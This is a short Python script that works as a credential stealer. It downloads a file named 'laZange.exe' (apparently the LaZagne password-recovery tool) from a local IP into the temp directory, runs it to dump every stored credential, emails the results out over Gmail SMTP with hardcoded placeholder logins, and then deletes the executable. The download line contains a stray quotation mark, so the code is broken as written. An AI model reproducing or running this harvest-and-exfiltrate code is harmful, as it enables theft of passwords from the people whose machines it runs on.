import requests , smtplib , subprocess , os , tempfile

def download(url) : 
	get_response = requests.get(url)
	filename = url.split("/")[-1]
	with open(filename,"wb") as ofs : 
		ofs.write(get_response.content)

def sendmail(email,password,message) : 
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,"receiver@gmail.com",message)
	server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("10.0.2.16"/laZange.exe")

result = subprocess.check_output("python laZange.exe all",shell=True)

sendmail("sender@gmail.com" , "senderpass" , result)

os.remove("laZange.exe")